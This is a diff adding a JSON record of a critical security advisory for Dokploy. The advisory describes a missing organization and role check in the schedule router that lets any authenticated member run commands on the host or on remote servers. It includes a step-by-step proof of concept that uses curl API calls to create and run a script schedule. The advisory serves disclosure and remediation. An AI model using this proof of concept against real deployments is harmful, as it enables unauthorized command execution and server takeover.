@@ -1,0 +1,52 @@
+{
+  "global": null,
+  "id": "GHSA-7wmr-57mg-h5q6",
+  "repo": {
+    "cve_id": "CVE-2026-45632",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-269",
+      "CWE-78",
+      "CWE-862"
+    ],
+    "description": "## Summary\r\nThe `schedule` router does not enforce organization/role checks. As a result, **any authenticated user** can create, update, run, or delete schedules belonging to other organizations if they know the `scheduleId`/`serverId`. Schedule types `server` and `dokploy-server` write and execute scripts on the host or remote servers, enabling **RCE** on the Dokploy host or a target server.\r\n\r\n## Impact\r\n- Arbitrary command execution on the Dokploy host (`dokploy-server`).\r\n- Arbitrary command execution on registered remote servers (`server`).\r\n- Unauthorized schedule deletion or abuse.\r\n\r\n## Affected Components\r\n- `apps/dokploy/server/api/routers/schedule.ts` (create/update/delete/one/runManually/list)\r\n- `packages/server/src/services/schedule.ts` (script creation on filesystem)\r\n- `packages/server/src/utils/schedules/utils.ts` (script execution)\r\n\r\n## Environment Setup (Local)\r\n1. Run the installation as root.\r\n2. Ensure ports `80`, `443`, and `3000` are free.\r\n3. Install Dokploy:\r\n   ```bash\r\n   curl -sSL https://dokploy.com/install.sh | sh\r\n   ```\r\n4. Open the web UI at `http://<server-ip>:3000` and create the first admin account.\r\n5. (Optional) Open Swagger UI at `http://<server-ip>:3000/swagger` to explore API endpoints.\r\n\r\n## Create a Member User + API Key (for repro)\r\n1. As admin: go to `http://<server-ip>:3000/dashboard/settings/users` and create an invitation.\r\n2. Open the invitation link in a new browser (incognito), sign up, and accept.\r\n3. Back as admin: go to `Settings → Users` and enable the member permission **Access to API/CLI**.\r\n4. Log in as the member: go to `http://<server-ip>:3000/dashboard/settings/profile` and generate an API key.\r\n\r\n## Steps to Reproduce (Host RCE via dokploy-server)\r\nThis variant does **not** require a remote serverId.\r\n1. As the member user, call `schedule.create` with `scheduleType: \"dokploy-server\"` and a script payload.\r\n2. Call `schedule.runManually` to execute it immediately.\r\n3. Verify the command executed on the Dokploy host (e.g., SSH in and read `/tmp/dokploy-pwn`).\r\n\r\n## Proof of Concept (Host RCE)\r\n<img width=\"2879\" height=\"388\" alt=\"image\" src=\"https://github.com/user-attachments/assets/2e401c34-285c-4183-882c-78e32962b372\" />\r\n<img width=\"2664\" height=\"186\" alt=\"image\" src=\"https://github.com/user-attachments/assets/2f31fa00-401e-4ce3-9f46-5dbd151fc6e5\" />\r\n\r\n```bash\r\n# Create schedule\r\ncurl -sS -X POST \"https://<host>/api/trpc/schedule.create\" \\\r\n  -H \"content-type: application/json\" \\\r\n  -H \"x-api-key: <MEMBER_API_KEY>\" \\\r\n  -d '{\r\n    \"json\": {\r\n      \"name\": \"pwn\",\r\n      \"cronExpression\": \"* * * * *\",\r\n      \"scheduleType\": \"dokploy-server\",\r\n      \"appName\": \"pwn-sched\",\r\n      \"command\": \"true\",\r\n      \"script\": \"id > /tmp/dokploy-pwn\"\r\n    }\r\n  }' -w \"\\n\"\r\n\r\n# Run immediately\r\ncurl -sS -X POST \"https://<host>/api/trpc/schedule.runManually\" \\\r\n  -H \"content-type: application/json\" \\\r\n  -H \"x-api-key: <MEMBER_API_KEY>\" \\\r\n  -d '{\"json\": {\"scheduleId\": \"<returned-schedule-id>\"}}' -w \"\\n\"\r\n\r\n# Verify on container \r\ndocker ps | grep dokploy\r\ndocker exec -it <CONTAINER_ID> /bin/bash\r\ncat /tmp/dokploy-pwn\r\n```\r\n\r\n## Optional Variant: Remote Server RCE\r\n1. As admin, register a server under `http://<host>:3000/dashboard/settings/servers` and note its `serverId` (visible in the server detail URL or via Swagger).\r\n2. As the member user, create a schedule with `scheduleType: \"server\"` and that `serverId`.\r\n3. Run it using `schedule.runManually`.\r\n\r\n## Root Cause\r\nThe `schedule` router never checks `organizationId` or role before invoking service methods. The service layer accepts raw IDs and writes/executes scripts directly on the host/remote server.\r\n\r\n## Recommended Fix\r\n- Enforce org/role checks on all `schedule` procedures.\r\n- Restrict `server` and `dokploy-server` schedule types to owner/admin roles.\r\n- Validate that `serverId`/`scheduleId` belongs to `activeOrganizationId`.",
+    "ghsa_id": "GHSA-7wmr-57mg-h5q6",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-7wmr-57mg-h5q6",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-7wmr-57mg-h5q6"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-45632"
+      }
+    ],
+    "published_at": "2026-05-11T18:36:55Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Schedule Authorization Bypass Enables Host/Server Command Execution",
+    "updated_at": "2026-05-13T04:37:00Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": ""
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "<= v0.26.7"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
